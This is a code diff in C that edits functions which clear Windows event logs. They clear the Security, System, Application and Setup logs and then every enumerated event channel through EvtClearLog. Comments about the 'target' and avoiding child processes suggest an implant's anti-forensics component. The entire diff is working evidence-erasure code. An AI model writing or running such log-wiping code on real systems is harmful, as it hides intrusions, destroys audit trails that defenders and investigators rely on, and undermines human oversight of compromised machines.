@@ -27,10 +27,8 @@
  * Requires: wevtapi.dll (Vista+, always present on Windows 7+).
  * No child processes are spawned.
  */
-bool jocky_clear_logs(void)
+void jocky_clear_logs(void)
 {
-    /* Legacy path: clear the four classic logs using the old API as well,
-     * in case EvtClearLog doesn't cover their backing files on the target. */
     static const char* CLASSIC[] = {
         "Application", "Security", "System", "Setup", NULL
     };
@@ -42,29 +40,26 @@ bool jocky_clear_logs(void)
         }
     }
 
-    /* Modern path: enumerate every known channel and clear it */
     EVT_HANDLE hEnum = EvtOpenChannelEnum(NULL, 0);
-    if (!hEnum) return false;
+    if (!hEnum) return;
 
     wchar_t channel[1024];
-    DWORD used   = 0;
-    int   cleared = 0;
+    DWORD used = 0;
 
     while (EvtNextChannelPath(hEnum, (DWORD)(sizeof(channel) / sizeof(wchar_t)),
                               channel, &used)) {
         EvtClearLog(NULL, channel, NULL, 0);
-        cleared++;
     }
 
     EvtClose(hEnum);
-    return cleared > 0;
 }
 
 /* Clear specific comma-separated channel names, or all channels if NULL/empty */
 int32_t jocky_cleanup_event_logs(const char* channels)
 {
     if (!channels || *channels == '\0') {
-        return jocky_clear_logs() ? 0 : -1;
+        jocky_clear_logs();
+        return 0;
     }
 
     char buf[4096];
